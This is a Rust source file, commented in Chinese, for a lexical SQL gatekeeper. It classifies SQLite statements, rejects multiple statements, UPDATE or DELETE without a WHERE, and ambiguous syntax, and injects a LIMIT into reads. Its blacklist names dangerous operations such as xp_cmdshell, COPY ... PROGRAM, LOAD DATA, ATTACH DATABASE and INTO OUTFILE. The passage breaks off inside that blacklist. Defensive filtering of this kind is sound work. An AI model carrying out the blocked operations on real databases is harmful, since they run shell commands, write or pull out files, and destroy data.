//! SQL 分类、单语句、静态黑名单与 `LIMIT` 注入（P5 数据库闸门）。
//!
//! 解析是**词法级**的，不引数据库驱动或 SQL 解析依赖：
//! - 扫描时跳过 `--` 行注释、`/* ... */` 块注释（SQLite/MySQL 不嵌套）、
//!   单引号字符串、双引号/反引号/方括号标识符；`$` 按 SQLite 参数前缀
//!   当作普通词 token，不启用 Postgres dollar-quoted 字符串；
//! - 默认按 SQLite 方言解析：单引号字符串只接受 `''` 转义，`\` 是普通
//!   字符。MySQL 方言（显式选择时）才启用反斜杠转义；当前 sidecar 只执行
//!   SQLite，方言默认值必须保持 SQLite；
//! - 关键字只在括号深度 0 上判定，`(SELECT ... WHERE ...)` 里的 `WHERE`
//!   不会被当成外层条件；`WITH` / `EXPLAIN` 会继续看主语句或 CTE 体内的
//!   数据修改，避免 `WITH ... DELETE` / `EXPLAIN ANALYZE DELETE` 被当成 Read；
//! - `CREATE ... TRIGGER ... BEGIN ... END` 按触发器体逐条检查
//!   UPDATE/DELETE/MERGE 的顶层 WHERE，体内的 `;` 不切分语句；
//! - `LIMIT` 注入只看真正的限制子句（`LIMIT <值>`、`FETCH FIRST/NEXT`、
//!   `SELECT TOP ...`）；名为 `top` / `limit` / `fetch` 的列不会抑制注入；
//! - `PRAGMA` 只把只读白名单（`table_info` / `index_list` 等）归为 Read；
//!   带 `=`、括号赋值或未知名称的 pragma 归 Write，`db_query` 会拒绝；
//! - 单语句按顶层 `;` 切分，空语句忽略；
//! - 黑名单同样只匹配 token，字符串/注释里的“DROP DATABASE”不会误伤；
//! - 解析不了的输入（未闭合字符串/注释等）一律报错，不降级为放行。
//!
//! 已知边界（需要执行层兜底，见 `docs/MILESTONES.md` P5 出口标准）：
//! MySQL `#` 行注释与 MSSQL `#temp`、MySQL 可执行注释 `/*! ... */` 存在
//! 词法歧义，本模块直接拒绝（fail-closed）；`SELECT ... INTO OUTFILE/DUMPFILE`
//! 已列入黑名单，但 `SELECT ... INTO 新表` 等方言写路径仍可能被归为 Read。
//! 协议级只读事务/连接是最终防线，本模块的结果 `trust: untrusted` 由执行层
//! 处理，不属于这里。

use lc_proto::{ErrorBody, ErrorCode};

/// 语句类型。`Unknown` 一律 fail-closed 拒绝。
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum SqlKind {
    /// 只读查询：SELECT / WITH / EXPLAIN / 只读 PRAGMA / SHOW / DESCRIBE。
    Read,
    /// 写数据：INSERT / UPDATE / DELETE / MERGE，以及可写 PRAGMA。
    Write,
    /// 结构变更：CREATE / ALTER / DROP / TRUNCATE / GRANT / REVOKE。
    Ddl,
    /// 无法识别的语句。
    Unknown,
}

/// SQL 词法方言。当前 sidecar 只执行 SQLite，默认值必须是 [`SqlDialect::Sqlite`]。
///
/// MySQL 方言仅用于显式选择时的词法兼容：单引号/双引号里的反斜杠按转义
/// 处理。SQLite 不把 `\` 当转义，若用 MySQL 方言解析 SQLite SQL，会把字符串
/// 边界判断错，因此调用方不得在 SQLite 连接上切换方言。
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub enum SqlDialect {
    #[default]
    Sqlite,
    Mysql,
}

/// 通过闸门的语句：改写后的 SQL、分类与是否注入过 `LIMIT`。
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct GuardedSql {
    pub sql: String,
    pub kind: SqlKind,
    pub injected_limit: bool,
}

/// 闸门拒绝原因。`code()` 映射到 `lc_proto::ErrorCode`，传输层包装成
/// `ErrorBody`；`Blacklisted` / `ReadOnly` / `MissingWhere` 属于权限拒绝。
#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
pub enum SqlError {
    #[error("empty SQL statement")]
    EmptyStatement,
    #[error("multiple SQL statements are not allowed (found {count})")]
    MultipleStatements { count: usize },
    #[error("read-only connection rejects {kind:?} statement")]
    ReadOnly { kind: SqlKind },
    #[error("{statement} requires a top-level WHERE clause")]
    MissingWhere { statement: String },
    #[error("blacklisted SQL: {reason}")]
    Blacklisted { reason: String },
    #[error("unknown SQL statement: {head}")]
    UnknownStatement { head: String },
    #[error("unterminated {construct}")]
    Unterminated { construct: &'static str },
    #[error("unsupported SQL syntax: {construct}")]
    UnsupportedSyntax { construct: &'static str },
}

impl SqlError {
    /// 对应的契约错误码：输入形态问题归 `InvalidArgument`，安全拒绝归
    /// `PermissionDenied`。
    pub fn code(&self) -> ErrorCode {
        match self {
            SqlError::EmptyStatement
            | SqlError::MultipleStatements { .. }
            | SqlError::Unterminated { .. }
            | SqlError::UnsupportedSyntax { .. } => ErrorCode::InvalidArgument,
            SqlError::ReadOnly { .. }
            | SqlError::MissingWhere { .. }
            | SqlError::Blacklisted { .. }
            | SqlError::UnknownStatement { .. } => ErrorCode::PermissionDenied,
        }
    }

    pub fn to_error_body(&self) -> ErrorBody {
        ErrorBody::new(self.code(), self.to_string())
    }
}

/// SQL 闸门。默认 `LIMIT 100`、SQLite 方言；`with_default_limit` 把值夹到
/// `1..=1000`。
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct SqlGuard {
    default_limit: usize,
    dialect: SqlDialect,
}

impl Default for SqlGuard {
    fn default() -> Self {
        Self {
            default_limit: 100,
            dialect: SqlDialect::Sqlite,
        }
    }
}

impl SqlGuard {
    /// 构造自定义默认 `LIMIT`。越界值自动夹紧，不 panic；方言保持 SQLite。
    pub fn with_default_limit(limit: usize) -> Self {
        Self {
            default_limit: limit.clamp(1, 1000),
            ..Self::default()
        }
    }

    /// 切换词法方言。默认 SQLite；仅显式需要 MySQL 词法时使用。
    pub fn with_dialect(mut self, dialect: SqlDialect) -> Self {
        self.dialect = dialect;
        self
    }

    pub fn default_limit(&self) -> usize {
        self.default_limit
    }

    pub fn dialect(&self) -> SqlDialect {
        self.dialect
    }

    /// 校验单条 SQL 并按需注入 `LIMIT`。
    ///
    /// `read_only` 表示连接/事务只读：除 Read 以外的类型一律拒绝。无顶层
    /// `WHERE` 的 UPDATE/DELETE/MERGE（含 `CREATE TRIGGER` 体内）在**任何**
    /// 模式下都拒绝。
    pub fn check(&self, sql: &str, read_only: bool) -> Result<GuardedSql, SqlError> {
        let tokens = lex(sql, self.dialect)?;
        let statements = split_statements(&tokens);
        if statements.is_empty() {
            return Err(SqlError::EmptyStatement);
        }
        if statements.len() > 1 {
            return Err(SqlError::MultipleStatements {
                count: statements.len(),
            });
        }

        let tokens = statements[0];
        let classification = classify(tokens);

        if let Some(reason) = blacklist_reason(tokens) {
            return Err(SqlError::Blacklisted { reason });
        }
        if read_only && classification.kind != SqlKind::Read {
            return Err(SqlError::ReadOnly {
                kind: classification.kind,
            });
        }

        // 主语句（WITH/EXPLAIN 穿透后）的 WHERE 必须在顶层；CTE 体内的写由
        // `nested_write_without_where` 按各自括号作用域单独检查。
        let main_verb = match classification.head.as_str() {
            "WITH" => with_main_verb(tokens),
            "EXPLAIN" => explain_target_verb(tokens),
            _ => Some(classification.verb.clone()),
        };
        if let Some(statement) = main_verb
            .filter(|verb| matches!(verb.as_str(), "UPDATE" | "DELETE" | "MERGE"))
            .filter(|_| !has_top_level_word(tokens, &["WHERE"]))
        {
            return Err(SqlError::MissingWhere { statement });
        }
        if let Some(statement) = nested_write_without_where(tokens) {
            return Err(SqlError::MissingWhere { statement });
        }
        // 触发器体在词法上是顶层（`BEGIN ... ; END` 不带括号），`nested_write_without_where`
        // 看不到；必须显式扫描 BEGIN/END 内的语句。缺少完整的 BEGIN/END 形态时
        // fail-closed，避免把无法解析的触发器当普通 DDL 放行。
        if is_create_trigger(tokens) {
            if trigger_body_span(tokens).is_none() {
                return Err(SqlError::UnsupportedSyntax {
                    construct: "CREATE TRIGGER body",
                });
            }
            if let Some(statement) = trigger_write_without_where(tokens) {
                return Err(SqlError::MissingWhere { statement });
            }
        }
        if classification.kind == SqlKind::Unknown {
            return Err(SqlError::UnknownStatement {
                head: classification.head,
            });
        }

        let inject_limit = classification.kind == SqlKind::Read
            && matches!(classification.head.as_str(), "SELECT" | "WITH")
            && !has_top_level_limit_clause(tokens);

        // 只保留语句本体：去掉语句外空白/结尾分号/尾随注释；语句内部原文保留。
        let start = tokens.first().map_or(0, |token| token.start);
        let end = tokens.last().map_or(start, |token| token.end);
        let body = &sql[start..end];
        let sql = if inject_limit {
            format!("{body} LIMIT {}", self.default_limit)
        } else {
            body.to_string()
        };

        Ok(GuardedSql {
            sql,
            kind: classification.kind,
            injected_limit: inject_limit,
        })
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum TokenKind {
    Word,
    QuotedIdentifier,
    StringLiteral,
    Number,
    Punct,
}

/// 词法 token。`depth` 是 token 开始前的括号深度；`(` 自身记外层深度，
/// `)` 记闭合后的深度，因此顶层 token 恒为 `depth == 0`。
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
struct Token<'a> {
    kind: TokenKind,
    text: &'a str,
    depth: usize,
    start: usize,
    end: usize,
}

struct Classification {
    /// 首个关键字（大写），用于决定是否注入 LIMIT。
    head: String,
    /// 实际主语句动词（WITH/EXPLAIN 会向内找），用于 WHERE 与分类。
    verb: String,
    kind: SqlKind,
}

fn lex(sql: &str, dialect: SqlDialect) -> Result<Vec<Token<'_>>, SqlError> {
    let backslash_escapes = dialect == SqlDialect::Mysql;
    let bytes = sql.as_bytes();
    let len = bytes.len();
    let mut tokens = Vec::new();
    let mut depth = 0usize;
    let mut i = 0usize;

    while i < len {
        let byte = bytes[i];
        // node:sqlite 在 NUL 处截断 SQL；若放过 NUL，闸门会看到被截断部分
        // 之后的 WHERE，而 SQLite 实际执行的是没有 WHERE 的前缀。
        if byte == 0 {
            return Err(SqlError::UnsupportedSyntax {
                construct: "NUL byte",
            });
        }
        if byte.is_ascii_whitespace() {
            i += 1;
            continue;
        }

        // `--` 行注释。按标准 SQL 处理：无“后接空白”的 MySQL 特例。
        if byte == b'-' && bytes.get(i + 1) == Some(&b'-') {
            i += 2;
            while i < len && bytes[i] != b'\n' && bytes[i] != b'\r' {
                i += 1;
            }
            continue;
        }

        // `#` 在 MySQL 是行注释、在 MSSQL 是临时表前缀，无法无歧义区分。
        // 直接拒绝，避免把注释内容当成 SQL 或把临时表名拆错。
        if byte == b'#' {
            return Err(SqlError::UnsupportedSyntax {
                construct: "MySQL '#' comments / MSSQL '#' temp tables",
            });
        }

        // 块注释。SQLite/MySQL 都不支持嵌套：到第一个 `*/` 结束。
        if byte == b'/' && bytes.get(i + 1) == Some(&b'*') {
            // MySQL 的 `/*! ... */` 是会被执行的代码，不是普通注释；
            // 分类器不解析其内容，直接拒绝以免藏语句。
            if bytes.get(i + 2) == Some(&b'!') {
                return Err(SqlError::UnsupportedSyntax {
                    construct: "MySQL executable comment",
                });
            }
            i += 2;
            let mut terminated = false;
            while i < len {
                if bytes[i] == b'*' && bytes.get(i + 1) == Some(&b'/') {
                    i += 2;
                    terminated = true;
                    break;
                }
                i += 1;
            }
            if !terminated {
                return Err(SqlError::Unterminated {
                    construct: "block comment",
                });
            }
            continue;
        }

        let start = i;
        match byte {
            b'\'' => {
                let end = scan_quoted(bytes, start, b'\'', "string literal", backslash_escapes)?;
                tokens.push(Token {
                    kind: TokenKind::StringLiteral,
                    text: &sql[start..end],
                    depth,
                    start,
                    end,
                });
                i = end;
            }
            b'"' => {
                let end = scan_quoted(bytes, start, b'"', "quoted identifier", backslash_escapes)?;
                tokens.push(Token {
                    kind: TokenKind::QuotedIdentifier,
                    text: &sql[start..end],
                    depth,
                    start,
                    end,
                });
                i = end;
            }
            b'`' => {
                let end = scan_quoted(bytes, start, b'`', "quoted identifier", false)?;
                tokens.push(Token {
                    kind: TokenKind::QuotedIdentifier,
                    text: &sql[start..end],
                    depth,
                    start,
                    end,
                });
                i = end;
            }
            b'[' => {
                let end = scan_quoted(bytes, start, b']', "bracket identifier", false)?;
                tokens.push(Token {
                    kind: TokenKind::QuotedIdentifier,
                    text: &sql[start..end],
                    depth,
                    start,
                    end,
                });
                i = end;
            }
            b'$' => {
                // SQLite/MySQL 没有 Postgres dollar-quoted 字符串：`$` 是
                // 参数前缀，按普通词处理，不能吞掉 `;` 或 `WHERE`。
                let end = consume_word(bytes, start);
                tokens.push(Token {
                    kind: TokenKind::Word,
                    text: &sql[start..end],
                    depth,
                    start,
                    end,
                });
                i = end;
            }
            b'(' => {
                tokens.push(Token {
                    kind: TokenKind::Punct,
                    text: &sql[start..start + 1],
                    depth,
                    start,
                    end: start + 1,
                });
                depth += 1;
                i += 1;
            }
            b')' => {
                depth = depth.saturating_sub(1);
                tokens.push(Token {
                    kind: TokenKind::Punct,
                    text: &sql[start..start + 1],
                    depth,
                    start,
                    end: start + 1,
                });
                i += 1;
            }
            b';' => {
                tokens.push(Token {
                    kind: TokenKind::Punct,
                    text: &sql[start..start + 1],
                    depth,
                    start,
                    end: start + 1,
                });
                i += 1;
            }
            _ if byte.is_ascii_digit() => {
                let end = consume_word(bytes, start);
                tokens.push(Token {
                    kind: TokenKind::Number,
                    text: &sql[start..end],
                    depth,
                    start,
                    end,
                });
                i = end;
            }
            _ if is_word_start(byte) => {
                let end = consume_word(bytes, start);
                tokens.push(Token {
                    kind: TokenKind::Word,
                    text: &sql[start..end],
                    depth,
                    start,
                    end,
                });
                i = end;
            }
            _ => {
                // 单字符标点（含运算符）。SQL 关键字判定不依赖多字符运算符。
                tokens.push(Token {
                    kind: TokenKind::Punct,
                    text: &sql[start..start + 1],
                    depth,
                    start,
                    end: start + 1,
                });
                i += 1;
            }
        }
    }

    Ok(tokens)
}

fn is_word_start(byte: u8) -> bool {
    byte.is_ascii_alphabetic() || byte == b'_' || !byte.is_ascii()
}

fn consume_word(bytes: &[u8], start: usize) -> usize {
    let mut i = start;
    while i < bytes.len() {
        let byte = bytes[i];
        if byte.is_ascii_alphanumeric() || byte == b'_' || byte == b'$' || !byte.is_ascii() {
            i += 1;
        } else {
            break;
        }
    }
    i
}

/// 扫描单引号/双引号/反引号/方括号包围的 token，返回闭合符之后的位置。
/// `backslash_escapes` 只在 MySQL 方言为 true；SQLite 下 `\` 是普通字符。
/// 双写闭合符（`''`、`""`、`` `` ``、`]]`）始终按转义处理。
fn scan_quoted(
    bytes: &[u8],
    start: usize,
    closing: u8,
    construct: &'static str,
    backslash_escapes: bool,
) -> Result<usize, SqlError> {
    let mut i = start + 1;
    while i < bytes.len() {
        let byte = bytes[i];
        if backslash_escapes && byte == b'\\' {
            if i + 1 >= bytes.len() {
                return Err(SqlError::Unterminated { construct });
            }
            i += 2;
            continue;
        }
        if byte == closing {
            if bytes.get(i + 1) == Some(&closing) {
                i += 2;
                continue;
            }
            return Ok(i + 1);
        }
        i += 1;
    }
    Err(SqlError::Unterminated { construct })
}

fn split_statements<'a, 'sql>(tokens: &'a [Token<'sql>]) -> Vec<&'a [Token<'sql>]> {
    let mut statements = Vec::new();
    let mut start = 0usize;
    // CREATE TRIGGER 的 `BEGIN ... ; ... END` 体内分号是语句分隔符，但整个
    // 触发器仍是一条 SQL 语句；在匹配 END 之前不能切分。
    let mut trigger_end: Option<usize> = None;
    for (index, token) in tokens.iter().enumerate() {
        if index == start {
            trigger_end = trigger_body_span(&tokens[start..]).map(|(_, end)| start + end);
        }
        if token.kind == TokenKind::Punct
            && token.text == ";"
            && token.depth == 0
            && !trigger_end.is_some_and(|end| index < end)
        {
            if index > start {
                statements.push(&tokens[start..index]);
            }
            start = index + 1;
        }
    }
    if start < tokens.len() {
        statements.push(&tokens[start..]);
    }
    statements
}

fn classify(tokens: &[Token<'_>]) -> Classification {
    let Some(first) = tokens.first() else {
        return Classification {
            head: String::new(),
            verb: String::new(),
            kind: SqlKind::Unknown,
        };
    };
    if first.kind != TokenKind::Word {
        return Classification {
            head: first.text.to_string(),
            verb: String::new(),
            kind: SqlKind::Unknown,
        };
    }

    let head = first.text.to_ascii_uppercase();
    let verb = match head.as_str() {
        "WITH" => with_verb(tokens),
        "EXPLAIN" => explain_verb(tokens),
        _ => Some(head.clone()),
    };
    // PRAGMA 不能只看首词：`PRAGMA user_version=42` 会写库。
    let kind = if head == "PRAGMA" {
        pragma_kind(tokens)
    } else {
        verb.as_deref().map_or(SqlKind::Unknown, kind_of)
    };
    Classification {
        head,
        verb: verb.unwrap_or_default(),
        kind,
    }
}

fn kind_of(verb: &str) -> SqlKind {
    match verb {
        "SELECT" | "WITH" | "EXPLAIN" | "PRAGMA" | "SHOW" | "DESCRIBE" => SqlKind::Read,
        "INSERT" | "UPDATE" | "DELETE" | "MERGE" => SqlKind::Write,
        "CREATE" | "ALTER" | "DROP" | "TRUNCATE" | "GRANT" | "REVOKE" => SqlKind::Ddl,
        _ => SqlKind::Unknown,
    }
}

/// SQLite 只读 PRAGMA 白名单（名称大写）。
///
/// 括号参数只在白名单名称下被视为读参数；带 `=`、未知名称（包括
/// `user_version` / `journal_mode` / `foreign_keys` 等可写 pragma）一律按
/// Write 处理，由 `db_query` 拒绝，`db_execute` 才走写路径。
const READ_ONLY_PRAGMAS: &[&str] = &[
    "TABLE_INFO",
    "TABLE_XINFO",
    "TABLE_LIST",
    "INDEX_LIST",
    "INDEX_INFO",
    "INDEX_XINFO",
    "FOREIGN_KEY_LIST",
    "DATABASE_LIST",
    "COLLATION_LIST",
    "COMPILE_OPTIONS",
    "FUNCTION_LIST",
    "MODULE_LIST",
    "PRAGMA_LIST",
];

/// `PRAGMA [schema.]name [(args)] [= value]` 的分类。
///
/// 无法确定名称（空 PRAGMA、只有表达式）时返回 `Unknown`，由闸门 fail-closed
/// 拒绝。可写/未知名称返回 `Write`，保留 `db_execute` 的显式写路径。
fn pragma_kind(tokens: &[Token<'_>]) -> SqlKind {
    let Some(first) = tokens.first() else {
        return SqlKind::Unknown;
    };
    if first.kind != TokenKind::Word || !first.text.eq_ignore_ascii_case("PRAGMA") {
        return SqlKind::Unknown;
    }

    let mut name = None;
    let mut assignment = false;
    for token in tokens.iter().skip(1) {
        if token.depth != 0 {
            break;
        }
        match token.kind {
            TokenKind::Punct if token.text == "=" => {
                assignment = true;
                break;
            }
            TokenKind::Punct if token.text == ";" || token.text == "(" => break,
            TokenKind::Punct if token.text == "." => continue,
            TokenKind::Word | TokenKind::QuotedIdentifier => name = token_name(token),
            _ => break,
        }
    }

    match (name.as_deref(), assignment) {
        (None, _) => SqlKind::Unknown,
        (Some(_), true) => SqlKind::Write,
        (Some(name), false) if READ_ONLY_PRAGMAS.contains(&name) => SqlKind::Read,
        (Some(_), false) => SqlKind::Write,
    }
}

/// 任意数据修改动词，包含 CTE 体内的写（`WITH x AS (DELETE ... RETURNING *)
/// SELECT ...` 会真的写库）。字符串/注释/引号标识符不会被当作 Word。
fn data_modification_verb(tokens: &[Token<'_>]) -> Option<String> {
    tokens.iter().skip(1).find_map(|token| {
        if token.kind != TokenKind::Word {
            return None;
        }
        let word = token.text.to_ascii_uppercase();
        matches!(word.as_str(), "INSERT" | "UPDATE" | "DELETE" | "MERGE").then_some(word)
    })
}

/// `WITH` 的实际动词：优先识别数据修改，否则取主语句动词。
fn with_verb(tokens: &[Token<'_>]) -> Option<String> {
    data_modification_verb(tokens).or_else(|| with_main_verb(tokens))
}

/// `EXPLAIN` 的实际动词：优先识别目标/CTE 内的数据修改，否则取目标语句。
fn explain_verb(tokens: &[Token<'_>]) -> Option<String> {
    data_modification_verb(tokens).or_else(|| explain_target_verb(tokens))
}

/// `WITH ... SELECT|INSERT|UPDATE|DELETE|MERGE` 的主语句动词。
///
/// CTE 名与列清单都在括号内或 `AS` 前后，不能仅凭“第一个动词”判断；
/// 这里跳过所有括号内 token，从第一个顶层 `)`（CTE 体或列清单结束）之后找
/// 首个主语句动词。找不到（例如 `WITH ... VALUES`）按 Unknown 处理。
fn with_main_verb(tokens: &[Token<'_>]) -> Option<String> {
    let mut after_cte_body = false;
    for token in tokens.iter().skip(1) {
        if token.depth != 0 {
            continue;
        }
        if token.kind == TokenKind::Punct && token.text == ")" {
            after_cte_body = true;
            continue;
        }
        if !after_cte_body || token.kind != TokenKind::Word {
            continue;
        }
        let word = token.text.to_ascii_uppercase();
        if is_statement_verb(&word) {
            return Some(word);
        }
    }
    None
}

/// `EXPLAIN [ANALYZE] [(options)] <statement>` 的目标动词。
///
/// `EXPLAIN ANALYZE DELETE ...` 会真的执行 DELETE，不能只按 EXPLAIN 判 Read。
/// 仍不注入 LIMIT（`check` 按首个关键字 EXPLAIN 排除）。
fn explain_target_verb(tokens: &[Token<'_>]) -> Option<String> {
    tokens
        .iter()
        .skip(1)
        .filter(|token| token.depth == 0 && token.kind == TokenKind::Word)
        .map(|token| token.text.to_ascii_uppercase())
        .find(|word| is_statement_verb(word))
}

fn is_statement_verb(word: &str) -> bool {
    matches!(
        word,
        "SELECT"
            | "INSERT"
            | "UPDATE"
            | "DELETE"
            | "MERGE"
            | "CREATE"
            | "ALTER"
            | "DROP"
            | "TRUNCATE"
            | "GRANT"
            | "REVOKE"
            | "PRAGMA"
            | "SHOW"
            | "DESCRIBE"
    )
}

fn has_top_level_word(tokens: &[Token<'_>], words: &[&str]) -> bool {
    tokens.iter().any(|token| {
        token.depth == 0
            && token.kind == TokenKind::Word
            && words
                .iter()
                .any(|word| token.text.eq_ignore_ascii_case(word))
    })
}

fn is_top_level_word(token: &Token<'_>, word: &str) -> bool {
    token.depth == 0 && token.kind == TokenKind::Word && token.text.eq_ignore_ascii_case(word)
}

/// 是否已有真正的顶层行数限制子句。不能只看关键字：列名 `top`、`limit`、
/// `fetch` 也会是顶层 Word，误判会导致不注入而放大结果集。
fn has_top_level_limit_clause(tokens: &[Token<'_>]) -> bool {
    has_limit_clause(tokens) || has_fetch_clause(tokens) || has_select_top_clause(tokens)
}

/// `LIMIT <number|?|:name>` 只在后接限制值时成立。
fn has_limit_clause(tokens: &[Token<'_>]) -> bool {
    tokens.iter().enumerate().any(|(index, token)| {
        is_top_level_word(token, "LIMIT") && limit_operand(tokens.get(index + 1))
    })
}

fn limit_operand(token: Option<&Token<'_>>) -> bool {
    match token {
        Some(token) if token.depth == 0 => match token.kind {
            TokenKind::Number => true,
            TokenKind::Punct => token.text == "?" || token.text == ":",
            _ => false,
        },
        _ => false,
    }
}

/// `FETCH FIRST|NEXT ...`；同样要求后继关键字，避免把 `SELECT fetch` 当子句。
fn has_fetch_clause(tokens: &[Token<'_>]) -> bool {
    tokens.windows(2).any(|pair| {
        is_top_level_word(&pair[0], "FETCH")
            && (is_top_level_word(&pair[1], "FIRST") || is_top_level_word(&pair[1], "NEXT"))
    })
}

/// `SELECT [ALL|DISTINCT] TOP <number>|(<expr>)`。TOP 必须位于 SELECT
/// 修饰位置，`SELECT top FROM t` 里的列名不算。
fn has_select_top_clause(tokens: &[Token<'_>]) -> bool {
    for (index, token) in tokens.iter().enumerate() {
        if !is_top_level_word(token, "SELECT") {
            continue;
        }
        let mut next = index + 1;
        if tokens.get(next).is_some_and(|token| {
            is_top_level_word(token, "ALL") || is_top_level_word(token, "DISTINCT")
        }) {
            next += 1;
        }
        if !tokens
            .get(next)
            .is_some_and(|token| is_top_level_word(token, "TOP"))
        {
            continue;
        }
        match tokens.get(next + 1) {
            Some(token) if token.depth == 0 && token.kind == TokenKind::Number => return true,
            Some(token)
                if token.depth == 0 && token.kind == TokenKind::Punct && token.text == "(" =>
            {
                return true;
            }
            _ => {}
        }
    }
    false
}

/// `CREATE [OR REPLACE] [TEMP|TEMPORARY] TRIGGER ...`。
fn is_create_trigger(tokens: &[Token<'_>]) -> bool {
    let mut index = 0usize;
    if !tokens
        .get(index)
        .is_some_and(|token| is_top_level_word(token, "CREATE"))
    {
        return false;
    }
    index += 1;
    if tokens
        .get(index)
        .is_some_and(|token| is_top_level_word(token, "OR"))
        && tokens
            .get(index + 1)
            .is_some_and(|token| is_top_level_word(token, "REPLACE"))
    {
        index += 2;
    }
    if tokens.get(index).is_some_and(|token| {
        is_top_level_word(token, "TEMP") || is_top_level_word(token, "TEMPORARY")
    }) {
        index += 1;
    }
    tokens
        .get(index)
        .is_some_and(|token| is_top_level_word(token, "TRIGGER"))
}

/// 定位触发器体 `BEGIN ... END`，返回 `(BEGIN, END)` 的 token 下标。
///
/// 头部 `ON table` 之后、`BEGIN` 之前还有 `FOR EACH ROW` / `WHEN expr`，
/// 其中可能出现名为 `begin` 的列；逐个尝试候选 BEGIN，只有能配平
/// `CASE`/`BEGIN`/`END` 的才是真正的语句体。
fn trigger_body_span(tokens: &[Token<'_>]) -> Option<(usize, usize)> {
    if !is_create_trigger(tokens) {
        return None;
    }
    let mut after_on = false;
    for (index, token) in tokens.iter().enumerate() {
        if token.depth != 0 || token.kind != TokenKind::Word {
            continue;
        }
        if is_top_level_word(token, "ON") {
            after_on = true;
            continue;
        }
        if !after_on || !is_top_level_word(token, "BEGIN") {
            continue;
        }
        if let Some(end) = trigger_body_end(tokens, index) {
            return Some((index, end));
        }
    }
    None
}

/// 从语句体 BEGIN 开始配平嵌套的 `CASE`/`BEGIN`，返回语句体 END 的下标。
///
/// 真正的触发器体 END 后面只能是语句结束符或输入结尾；头部 `WHEN` 里的
/// `CASE ... END` 后面紧跟的是真正的 BEGIN，借此排除误配候选。
fn trigger_body_end(tokens: &[Token<'_>], begin: usize) -> Option<usize> {
    let mut nesting = 1usize;
    for (index, token) in tokens.iter().enumerate().skip(begin + 1) {
        if token.depth != 0 || token.kind != TokenKind::Word {
            continue;
        }
        if is_top_level_word(token, "BEGIN") || is_top_level_word(token, "CASE") {
            nesting += 1;
        } else if is_top_level_word(token, "END") {
            nesting = nesting.saturating_sub(1);
            if nesting == 0 {
                let followed_by_end = match tokens.get(index + 1) {
                    None => true,
                    Some(next) => {
                        next.depth == 0 && next.kind == TokenKind::Punct && next.text == ";"
                    }
                };
                return followed_by_end.then_some(index);
            }
        }
    }
    None
}

/// 扫描触发器体内的 UPDATE/DELETE/MERGE；每条语句必须在同一词法层有
/// WHERE。触发器体语句不在括号内（depth 0），所以不能复用
/// `nested_write_without_where`。
fn trigger_write_without_where(tokens: &[Token<'_>]) -> Option<String> {
    let (begin, end) = trigger_body_span(tokens)?;
    let mut index = begin + 1;
    while index < end {
        let token = &tokens[index];
        if token.depth != 0 || token.kind != TokenKind::Word {
            index += 1;
            continue;
        }
        let word = token.text.to_ascii_uppercase();
        // INSERT ... ON CONFLICT DO UPDATE 的 UPDATE 不是独立语句，无需 WHERE。
        if !matches!(word.as_str(), "UPDATE" | "DELETE" | "MERGE")
            || preceding_top_level_word(tokens, begin, index).as_deref() == Some("DO")
        {
            index += 1;
            continue;
        }
        let statement_end = tokens[index + 1..end]
            .iter()
            .position(|next| next.depth == 0 && next.kind == TokenKind::Punct && next.text == ";")
            .map_or(end, |offset| index + 1 + offset);
        let has_where = tokens[index + 1..statement_end].iter().any(|next| {
            next.depth == 0
                && next.kind == TokenKind::Word
                && next.text.eq_ignore_ascii_case("WHERE")
        });
        if !has_where {
            return Some(word);
        }
        index = statement_end + 1;
    }
    None
}

/// 指定下标之前、指定下界之后的最近一个顶层 Word（大写）。
fn preceding_top_level_word(tokens: &[Token<'_>], lower: usize, index: usize) -> Option<String> {
    tokens[lower..index]
        .iter()
        .rev()
        .find(|token| token.depth == 0 && token.kind == TokenKind::Word)
        .map(|token| token.text.to_ascii_uppercase())
}

/// 括号内的 UPDATE/DELETE/MERGE 必须在**同一括号层**有 WHERE；主查询的
/// WHERE 不能替 CTE 内的写条件。只扫描到该层闭合 `)` 为止。
fn nested_write_without_where(tokens: &[Token<'_>]) -> Option<String> {
    for (index, token) in tokens.iter().enumerate() {
        if token.depth == 0 || token.kind != TokenKind::Word {
            continue;
        }
        let word = token.text.to_ascii_uppercase();
        if !matches!(word.as_str(), "UPDATE" | "DELETE" | "MERGE") {
            continue;
        }
        let depth = token.depth;
        let has_where = tokens
            .iter()
            .skip(index + 1)
            .take_while(|next| next.depth >= depth)
            .any(|next| {
                next.depth == depth
                    && next.kind == TokenKind::Word
                    && next.text.eq_ignore_ascii_case("WHERE")
            });
        if !has_where {
            return Some(word);
        }
    }
    None
}

fn blacklist_reason(tokens: &[Token<'_>]) -> Option<String> {
    // xp_cmdshell 可以出现在函数调用内（EXEC master..xp_cmdshell / SELECT
    // xp_cmdshell(...)），因此不限制括号深度；字符串与注释已不是 Word token。
    if is_xp_cmdshell_call(tokens) {
        return Some("xp_cmdshell is not allowed".to_string());
    }

    let first = tokens.first()?;
    if first.kind != TokenKind::Word {
        return None;
    }
    let head = first.text.to_ascii_uppercase();
    let top: Vec<&Token<'_>> = tokens.iter().filter(|token| token.depth == 0).collect();
    let top_words: Vec<String> = top
        .iter()
        .filter(|token| token.kind == TokenKind::Word)
        .map(|token| token.text.to_ascii_uppercase())
        .collect();

    match head.as_str() {
        "TRUNCATE" => Some("TRUNCATE is not allowed".to_string()),
        "GRANT" => Some("GRANT is not allowed".to_string()),
        "REVOKE" => Some("REVOKE is not allowed".to_string()),
        "DROP" if top_word_pair(&top, "DROP", "DATABASE") => {
            Some("DROP DATABASE is not allowed".to_string())
        }
        "DROP" if top_word_pair(&top, "DROP", "SCHEMA") => {
            Some("DROP SCHEMA is not allowed".to_string())
        }
        "ALTER" if top_word_pair(&top, "ALTER", "SYSTEM") => {
            Some("ALTER SYSTEM is not allowed".to_string())
        }
        "SET" if is_privileged_set(&top_words) => {
            Some("SET ROLE / SESSION AUTHORIZATION is not allowed".to_string())
        }
        "LOAD" if top_word_pair(&top, "LOAD", "DATA") => {
            Some("LOAD DATA is not allowed".to_string())
        }
        "ATTACH" if top_word_pair(&top, "ATTACH", "DATABASE") => {
            Some("ATTACH DATABASE is not allowed".to_string())
        }
        "COPY" if top_words.iter().skip(1).any(|word| word == "PROGRAM") => {
            Some("COPY ... PROGRAM is not allowed".to_string())
        }
        "PRAGMA"
